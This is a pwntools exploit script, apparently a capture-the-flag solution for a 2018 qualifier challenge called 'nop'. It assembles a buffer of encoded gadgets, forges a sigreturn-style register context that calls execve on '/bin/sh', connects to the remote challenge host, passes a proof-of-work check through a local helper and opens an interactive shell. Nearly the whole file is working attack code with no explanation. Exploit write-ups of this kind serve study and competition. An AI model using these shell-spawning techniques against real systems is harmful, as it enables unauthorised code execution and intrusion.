from pwn import *

def nop(x):
	cc = ''
	for xx in x:
		cc += p16(xx)
	return cc

inc_esi = [2715]
inc_edi = [3047]

esi_to_eax = [214, 43]
eax_to_edi = [54, 48]

esi_to_al = [120, 43]
and_edi_esi = [3624]

edi_to_eax_23 = [214, 3228]
eax_to_edi_23 = [54, 3228]
eax_to_esi = [29]

inc_esp = [2715, 2283]

buf = ''
buf += nop(inc_edi) * 0x10
buf += nop(inc_esi) * 0x14
buf += nop(esi_to_al)
buf += nop(eax_to_edi)
buf += nop(esi_to_al)
buf += nop(inc_edi) * 0x1
buf += nop(inc_esi) * 0x4
buf += nop(esi_to_al)
buf += nop(eax_to_edi)
buf += nop(esi_to_al)
buf += nop(inc_edi) * 0x1
buf += nop(inc_esi) * 0x2
buf += nop(esi_to_al)
buf += nop(eax_to_edi)
buf += nop(esi_to_al)
buf += nop(inc_edi) * 0x1
buf += nop(esi_to_al)
buf += nop(eax_to_edi)
buf += nop(esi_to_al)
buf += nop(inc_edi) * 0xa
buf += nop(edi_to_eax_23)
buf += nop(eax_to_esi)

edi = [0x40404e0d, 0x6c655720, 0x656d6f63, 0x206f7420,
		0x65746f4e,0x69724f20,0x65746e65,0x72502064,
		0x6172676f,0x6e696d6d,0x20212167,0x2d2d2d2d,
		0x4f4f4f4f,0x4f4f4f4f,0x4f4f4f4f,0x4f4f4f4f,
		0x4f4f4f4f,0x4f4f4f4f,0x4f4f4f4f,0x4f4f4f4f,
		0x4f4f4f4f,0x4f4f4f4f]

context = [
	0x63,
	0x0,
	0x2b,
	0x2b,
	0x0, # edi
	0x0, # esi
	0x60606f00, # ebp
	0x60606e00, # esp
	0x40404f94, # '/bin/sh'
	0x0, # edx
	0x0, # ecx
	0xb, # execve
	0x0, # trapno
	0x0, # err
	0x606063fb, # eip
	0x23, # cs
	0x246, # eflags
	0x0, # esp at signal
	0x2b, # ss
	0x00,
	0x00,
	0x00]

eax = 0x40404e0d
esi = []
esi_buf = ''
for i in xrange(22):
	if edi[i] ^ context[i] == eax:
		print 'no need'
		pass
	elif edi[i] ^ context[i] ^ eax < 0x10000:
		print 'two xor'
		v = 0xffffffff ^ eax
		esi.append(v)
		print hex(v)
		esi_buf += p32(v)
		buf += nop(esi_to_eax)
		buf += nop(inc_esi) * 4

		v = edi[i] ^ context[i] ^ 0xffffffff
		esi.append(v)
		print hex(v)
		esi_buf += p32(v)
		buf += nop(esi_to_eax)
		buf += nop(inc_esi) * 4
		eax = edi[i] ^ context[i]
	else:
		print 'one xor'
		v = edi[i] ^ context[i] ^ eax
		esi.append(v)
		print hex(v)
		esi_buf += p32(v)
		buf += nop(esi_to_eax)
		buf += nop(inc_esi) * 4
		eax = edi[i] ^ context[i]

	buf += nop(eax_to_edi_23)
	buf += nop(inc_edi) * 4

v = eax ^ 119
esi_buf += p32(v)
print hex(v)
buf += nop(esi_to_eax)
buf += nop(inc_esp) * 0x40

print '%s' % hex(0x40404000 + len(buf))

buf = buf.ljust(0x40404400 - 0x40404000, '\xff')
buf += ((('\xff' * 0x30) + esi_buf).ljust(0x100, '\xff')) * 10
print '%s' % hex(0x40404000 + len(buf))

buf = buf.ljust(0x40404e0d - 0x40404000, '\xff')
buf += p32(0x40404f00)
buf = buf.ljust(0x40404f00 - 0x40404000, '\xff')
buf += '\xff' * 0x30 + esi_buf
buf += '/bin/sh\x00'
buf += p32(0x0)

# p = process('./nop')
p = remote('4e6b5b46.quals2018.oooverflow.io', 31337)
def poc(p) :
   d = p.read()
   c = d.split("Challenge: ")[1].split("\n")
   challenge = c[0]
   n = c[1].split(": ")[1]
   name = "./poc " + challenge + " " + n
   p2 = subprocess.Popen(name.split(" "), stdout = subprocess.PIPE)
   solution = p2.stdout.read()
   print solution
   p.sendline(str(solution))
poc(p)

p.recvuntil('?\n')
p.send(buf)

p.interactive()



